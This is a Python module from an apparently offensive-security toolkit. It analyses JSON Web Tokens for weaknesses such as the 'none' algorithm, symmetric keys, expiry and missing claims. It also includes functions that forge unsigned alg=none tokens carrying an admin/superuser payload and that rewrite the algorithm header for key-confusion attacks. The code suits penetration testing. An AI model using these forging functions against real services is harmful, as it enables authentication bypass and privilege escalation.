#!/usr/bin/env python3
"""
JWT Utilities for token analysis, fingerprinting, and controlled manipulation.
Part of GraphCrack Offensive Security Toolkit.
"""

import jwt
import base64
import json
from typing import Dict, Any, Optional
from time import time


class JWTUtils:
    # ======================================================
    # 🔍 Decode & Basic Analysis
    # ======================================================
    @staticmethod
    def decode_token(token: str, verify: bool = False, secret: str = "") -> Optional[Dict[str, Any]]:
        """Decode a JWT token (safe mode, optional verify)."""
        try:
            if verify and secret:
                decoded = jwt.decode(token, secret, algorithms=["HS256", "HS384", "HS512", "RS256", "ES256"])
            else:
                decoded = jwt.decode(token, options={"verify_signature": False})
            return decoded
        except Exception as e:
            print(f"[!] Failed to decode JWT: {e}")
            return None

    # ======================================================
    # 🧠 Deep Token Analysis
    # ======================================================
    @staticmethod
    def analyze_token(token: str) -> Dict[str, Any]:
        """Analyze a JWT token for structure, algorithm, and weaknesses."""
        analysis = {
            "valid": False,
            "header": {},
            "payload": {},
            "algorithm": None,
            "vulnerabilities": [],
            "recommendations": []
        }

        try:
            parts = token.split(".")
            if len(parts) != 3:
                analysis["vulnerabilities"].append("Invalid JWT format (expected 3 parts).")
                return analysis

            header = JWTUtils._safe_b64decode(parts[0])
            payload = JWTUtils._safe_b64decode(parts[1])
            analysis.update({
                "valid": True,
                "header": header,
                "payload": payload,
                "algorithm": header.get("alg")
            })

            # Algorithm checks
            alg = header.get("alg", "").lower()
            if alg == "none":
                analysis["vulnerabilities"].append('⚠️ Algorithm "none" vulnerability (unsigned token).')
                analysis["recommendations"].append("Disallow 'none' as an algorithm on the server side.")

            if not alg:
                analysis["vulnerabilities"].append("❌ Missing algorithm field.")
                analysis["recommendations"].append("Ensure tokens always specify an algorithm.")

            weak_syms = ["hs256", "hs384", "hs512"]
            if alg in weak_syms:
                analysis["vulnerabilities"].append(f"⚠️ Symmetric algorithm in use ({alg}). Brute-force possible.")
                analysis["recommendations"].append("Use asymmetric keys (RS256/ES256) with strict signature validation.")

            # Key confusion (RS256 → HS256 flip)
            if alg.startswith("hs"):
                analysis["vulnerabilities"].append("⚠️ Possible key confusion vector if server also supports RS256.")

            # Expiration
            exp = payload.get("exp")
            if exp and exp < time():
                analysis["vulnerabilities"].append("⏰ Token expired.")
                analysis["recommendations"].append("Ensure expired tokens are rejected server-side.")

            # Issuer / audience checks
            for field in ["iss", "aud"]:
                if field not in payload:
                    analysis["vulnerabilities"].append(f"Missing '{field}' claim.")
                    analysis["recommendations"].append(f"Enforce validation of '{field}' claim.")

            # iat sanity
            if "iat" in payload and payload["iat"] > time():
                analysis["vulnerabilities"].append("⚠️ Issued-at (iat) timestamp is in the future.")

        except Exception as e:
            analysis["vulnerabilities"].append(f"Token analysis failed: {e}")

        return analysis

    # ======================================================
    # ⏰ Expiration Utility
    # ======================================================
    @staticmethod
    def is_token_expired(payload: Dict[str, Any]) -> bool:
        """Check if a JWT token payload is expired."""
        exp = payload.get("exp")
        return exp is not None and exp < time()

    # ======================================================
    # 🧬 Token Forge & Mutation
    # ======================================================
    @staticmethod
    def create_test_token(secret: str, algorithm: str = "HS256", payload: Optional[Dict] = None) -> str:
        """Create a test JWT for fuzzing or controlled replay."""
        default_payload = {
            "sub": "1234567890",
            "name": "GraphCrack Test User",
            "iat": int(time()),
            "exp": int(time()) + 3600,
        }
        if payload:
            default_payload.update(payload)
        return jwt.encode(default_payload, secret, algorithm=algorithm)

    @staticmethod
    def forge_unsigned_token(payload: Optional[Dict[str, Any]] = None) -> str:
        """Forge a JWT with alg=none (unsigned attack vector)."""
        data = payload or {"user": "admin", "role": "superuser"}
        header = {"alg": "none", "typ": "JWT"}
        token = (
            JWTUtils._safe_b64encode(json.dumps(header))
            + "."
            + JWTUtils._safe_b64encode(json.dumps(data))
            + "."
        )
        return token

    @staticmethod
    def mutate_algorithm(token: str, new_alg: str) -> str:
        """Change algorithm header (used for key confusion / downgrade testing)."""
        try:
            parts = token.split(".")
            header = JWTUtils._safe_b64decode(parts[0])
            header["alg"] = new_alg
            parts[0] = JWTUtils._safe_b64encode(json.dumps(header))
            return ".".join(parts)
        except Exception as e:
            print(f"[!] Algorithm mutation failed: {e}")
            return token

    # ======================================================
    # 🧩 Encoding Helpers
    # ======================================================
    @staticmethod
    def _safe_b64decode(data: str) -> Dict[str, Any]:
        """Base64url decode safely and parse JSON."""
        try:
            padded = data + "=" * (-len(data) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            return json.loads(decoded.decode("utf-8"))
        except Exception:
            return {}

    @staticmethod
    def _safe_b64encode(data: str) -> str:
        """Base64url encode safely."""
        return base64.urlsafe_b64encode(data.encode()).decode().rstrip("=")


# 🧪 CLI Preview Mode
if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python jwt_utils.py <jwt_token>")
        sys.exit(1)

    token = sys.argv[1]
    print("\n[+] Decoding & Analysis\n" + "─" * 60)
    info = JWTUtils.analyze_token(token)
    print(json.dumps(info, indent=2))

    if "none" in (info.get("header", {}).get("alg", "") or "").lower():
        print("\n[!] Forge unsigned clone:")
        forged = JWTUtils.forge_unsigned_token(info.get("payload", {}))
        print(f"    {forged}\n")